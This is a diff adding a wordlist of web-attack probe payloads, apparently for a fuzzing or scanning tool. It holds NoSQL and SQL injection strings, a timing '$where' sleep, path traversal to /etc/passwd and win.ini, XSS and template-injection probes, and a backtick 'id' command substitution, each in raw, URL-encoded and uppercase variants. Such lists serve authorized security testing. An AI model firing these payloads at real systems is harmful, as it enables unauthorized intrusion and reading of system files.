@@ -1,0 +1,80 @@
+{"$ne":null}
+{"$gt":""}
+{"$regex":".*"}
+admin" || "1"=="1
+' || 1==1 || '
+[$ne]=1
+[$regex]=.*
+[$where]=sleep(5000)
+test
+baseline
+AUROSE_PROBE
+../../../../etc/passwd
+..\..\..\..\windows\win.ini
+' OR '1'='1
+" OR "1"="1
+<script>alert(1)</script>
+${7*7}
+{{7*7}}
+`id`
+127.0.0.1
+http://127.0.0.1
+https://example.com
+%7B%22%24ne%22%3Anull%7D
+%7B%22%24gt%22%3A%22%22%7D
+%7B%22%24regex%22%3A%22.%2A%22%7D
+admin%22%20%7C%7C%20%221%22%3D%3D%221
+%27%20%7C%7C%201%3D%3D1%20%7C%7C%20%27
+%5B%24ne%5D%3D1
+%5B%24regex%5D%3D.%2A
+%5B%24where%5D%3Dsleep%285000%29
+..%2F..%2F..%2F..%2Fetc%2Fpasswd
+..%5C..%5C..%5C..%5Cwindows%5Cwin.ini
+%27%20OR%20%271%27%3D%271
+%22%20OR%20%221%22%3D%221
+%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+%24%7B7%2A7%7D
+%7B%7B7%2A7%7D%7D
+%60id%60
+http%3A%2F%2F127.0.0.1
+https%3A%2F%2Fexample.com
+{"$NE":NULL}
+{"$GT":""}
+{"$REGEX":".*"}
+ADMIN" || "1"=="1
+[$NE]=1
+[$REGEX]=.*
+[$WHERE]=SLEEP(5000)
+TEST
+BASELINE
+../../../../ETC/PASSWD
+..\..\..\..\WINDOWS\WIN.INI
+<SCRIPT>ALERT(1)</SCRIPT>
+`ID`
+HTTP://127.0.0.1
+HTTPS://EXAMPLE.COM
+%7B%22%24NE%22%3ANULL%7D
+%7B%22%24GT%22%3A%22%22%7D
+%7B%22%24REGEX%22%3A%22.%2A%22%7D
+ADMIN%22%20%7C%7C%20%221%22%3D%3D%221
+%5B%24NE%5D%3D1
+%5B%24REGEX%5D%3D.%2A
+%5B%24WHERE%5D%3DSLEEP%285000%29
+..%2F..%2F..%2F..%2FETC%2FPASSWD
+..%5C..%5C..%5C..%5CWINDOWS%5CWIN.INI
+%3CSCRIPT%3EALERT%281%29%3C%2FSCRIPT%3E
+%60ID%60
+HTTP%3A%2F%2F127.0.0.1
+HTTPS%3A%2F%2FEXAMPLE.COM
+admin" || "1"%3D%3D"1
+' || 1%3D%3D1 || '
+[$ne]%3D1
+[$regex]%3D.*
+[$where]%3Dsleep(5000)
+' OR '1'%3D'1
+" OR "1"%3D"1
+ADMIN" || "1"%3D%3D"1
+[$NE]%3D1
+[$REGEX]%3D.*
+[$WHERE]%3DSLEEP(5000)
+{"$ne":null}?v=0
